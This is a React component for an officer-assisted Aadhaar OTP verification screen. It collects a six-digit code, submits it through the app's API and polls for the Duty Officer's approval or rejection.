import React, { useState, useEffect, useRef } from 'react'
import { CheckCircle2, ShieldCheck, Clock, Loader2, ChevronLeft, AlertCircle } from 'lucide-react'
import * as api from '../../services/api'

function AadhaarOTP({ visitId, maskedAadhaar, onComplete, onBack }) {
  const [otp, setOtp] = useState(['', '', '', '', '', ''])
  const [status, setStatus] = useState('entering') // entering, submitting, waiting, done
  const [error, setError] = useState(null)
  const pollRef = useRef(null)
  const inputRefs = useRef([])

  useEffect(() => {
    if (status === 'waiting') {
      startPolling()
    }
    return () => {
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [status])

  const startPolling = () => {
    pollRef.current = setInterval(async () => {
      try {
        const res = await api.getManualOTPStatus(visitId)
        if (res.data.status === 'APPROVED') {
          clearInterval(pollRef.current)
          setStatus('done')
          setTimeout(() => onComplete({ visitId, status: 'APPROVED' }), 1500)
        } else if (res.data.status === 'REJECTED') {
          clearInterval(pollRef.current)
          onComplete({ visitId, status: 'REJECTED' })
        }
      } catch (e) {
        // Silent retry
      }
    }, 4000)
  }

  const handleOtpChange = (index, value) => {
    if (isNaN(value)) return
    const newOtp = [...otp]
    newOtp[index] = value.substring(value.length - 1)
    setOtp(newOtp)

    if (value && index < 5) {
      inputRefs.current[index + 1].focus()
    }
  }

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1].focus()
    }
  }

  const handleSubmit = async () => {
    const otpString = otp.join('')
    if (otpString.length !== 6) return

    setStatus('submitting')
    setError(null)
    try {
      const res = await api.submitManualOTP(visitId, otpString)
      if (res.data.success) {
        setStatus('waiting')
      } else {
        setError("Failed to relay OTP. Please try again.")
        setStatus('entering')
      }
    } catch (err) {
      setError("Service connection failed.")
      setStatus('entering')
    }
  }

  return (
    <div className="space-y-8 animate-in fade-in duration-500 max-w-xl mx-auto">
      <div className="flex items-center gap-4">
        <button onClick={onBack} className="p-2 hover:bg-slate-100 rounded-full transition-colors">
          <ChevronLeft className="w-6 h-6 text-gov-primary" />
        </button>
        <div>
          <h2 className="text-2xl font-bold text-gov-primary">OTP Verification</h2>
          <p className="text-sm text-gov-text-muted">ओटीपी सत्यापन</p>
        </div>
      </div>

      <div className="gov-card p-10 flex flex-col items-center text-center space-y-8 bg-white shadow-gov-lg">
        {status === 'entering' || status === 'submitting' ? (
          <>
            <div className="space-y-2">
                <div className="mx-auto w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center border-2 border-gov-primary shadow-inner">
                    <ShieldCheck className="w-8 h-8 text-gov-primary" />
                </div>
                <h3 className="text-xl font-bold text-slate-800">Enter UIDAI OTP</h3>
                <p className="text-sm text-gov-text-muted">
                    Received on mobile linked to Aadhaar: <span className="font-bold text-gov-primary">{maskedAadhaar}</span>
                </p>
            </div>

            <div className="flex gap-3">
              {otp.map((digit, idx) => (
                <input
                  key={idx}
                  ref={el => inputRefs.current[idx] = el}
                  type="text"
                  maxLength={1}
                  className="w-14 h-16 text-center text-2xl font-extrabold border-2 border-gov-border rounded-xl focus:border-gov-primary focus:ring-4 focus:ring-gov-primary/10 transition-all outline-none"
                  value={digit}
                  onChange={e => handleOtpChange(idx, e.target.value)}
                  onKeyDown={e => handleKeyDown(idx, e)}
                  disabled={status === 'submitting'}
                />
              ))}
            </div>

            <button
               onClick={handleSubmit}
               disabled={otp.join('').length !== 6 || status === 'submitting'}
               className="gov-button-primary w-full py-5 text-xl tracking-wide disabled:opacity-30"
            >
              {status === 'submitting' ? (
                <><Loader2 className="w-6 h-6 animate-spin" /> SUBMITTING...</>
              ) : (
                <>SUBMIT OTP FOR VERIFICATION</>
              )}
            </button>
          </>
        ) : status === 'waiting' ? (
            <div className="py-12 flex flex-col items-center gap-8 text-center">
                <div className="relative">
                    <div className="absolute inset-0 bg-gov-primary/10 rounded-full blur-2xl animate-pulse" />
                    <Clock className="w-20 h-20 text-gov-primary animate-spin relative" style={{ animationDuration: '4s' }} />
                </div>
                <div className="space-y-4">
                    <h3 className="text-2xl font-extrabold text-gov-primary uppercase tracking-tight">Relaying to Officer</h3>
                    <p className="text-sm text-gov-text-muted leading-relaxed max-w-sm">
                        Please wait while the Duty Officer relays your OTP to the UIDAI Tathya portal for identity clearance.
                    </p>
                </div>
                <div className="px-6 py-3 bg-blue-50 border border-blue-100 rounded-full text-xs font-bold text-gov-primary animate-pulse uppercase tracking-widest">
                    Officer Action Pending...
                </div>
            </div>
        ) : (
            <div className="py-12 flex flex-col items-center gap-6 text-gov-success">
                <CheckCircle2 className="w-20 h-20 animate-bounce" />
                <h3 className="text-2xl font-extrabold tracking-tight">IDENTITY VERIFIED</h3>
                <p className="text-sm text-slate-400 font-bold uppercase tracking-widest">Procedding to final status...</p>
            </div>
        )}

        {error && (
            <div className="flex items-center gap-3 p-4 bg-red-50 border border-red-100 rounded-xl text-red-700 text-sm font-bold">
                <AlertCircle className="w-5 h-5 shrink-0" /> {error}
            </div>
        )}
      </div>

      <div className="p-4 bg-yellow-50 border border-yellow-200 rounded-xl flex gap-3">
          <AlertCircle className="w-5 h-5 text-yellow-700 shrink-0 mt-0.5" />
          <p className="text-[11px] text-yellow-900 leading-relaxed font-medium">
              Note: This is an officer-assisted verification. The OTP will be relayed securely to the official UIDAI Tathya portal for identity confirmation.
          </p>
      </div>
    </div>
  )
}

export default AadhaarOTP
